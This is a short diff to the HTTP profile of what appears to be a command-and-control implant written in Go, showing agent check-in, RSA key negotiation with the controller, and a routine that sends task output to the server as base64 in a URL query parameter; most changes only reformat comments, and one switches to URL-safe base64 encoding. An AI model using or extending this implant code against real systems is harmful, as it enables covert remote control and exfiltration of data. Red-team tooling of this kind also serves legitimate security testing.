@@ -227,7 +227,7 @@ func (c *C2Default) ProfileType() string {
 	return "http"
 }
 
-//CheckIn a new agent
+// CheckIn a new agent
 func (c *C2Default) CheckIn() interface{} {
 
 	// Start Encrypted Key Exchange (EKE)
@@ -264,7 +264,7 @@ func (c *C2Default) CheckIn() interface{} {
 
 }
 
-//NegotiateKey - EKE key negotiation
+// NegotiateKey - EKE key negotiation
 func (c *C2Default) NegotiateKey() bool {
 	sessionID := GenerateSessionID()
 	pub, priv := crypto.GenerateRSAKeyPair()
@@ -307,14 +307,14 @@ func (c *C2Default) NegotiateKey() bool {
 	return true
 }
 
-//PostResponse - Post task responses
+// PostResponse - Post task responses
 func (c *C2Default) SendMessage(output []byte) interface{} {
 	endpoint := c.GetURI
 	return c.htmlPostData(endpoint, output)
 
 }
 
-//htmlPostData HTTP GET function
+// htmlPostData HTTP GET function
 func (c *C2Default) htmlPostData(urlEnding string, sendData []byte) []byte {
 	targeturl := fmt.Sprintf("%s%s", c.BaseURL, urlEnding)
 	if UseCustomC2FormatBool {
@@ -331,8 +331,7 @@ func (c *C2Default) htmlPostData(urlEnding string, sendData []byte) []byte {
 	} else {
 		sendData = append([]byte(UUID), sendData...) // Prepend the UUID
 	}
-	sendDataString := base64.StdEncoding.EncodeToString(sendData) // Base64 encode and convert to raw bytes
-	sendDataString = url.QueryEscape(sendDataString)
+	sendDataString := base64.URLEncoding.EncodeToString(sendData) // Base64 encode and convert to raw bytes
 	targeturl = fmt.Sprintf("%s?%s=%s", targeturl, c.QueryPathName, sendDataString)
 	//fmt.Printf(targeturl)
 	for true {
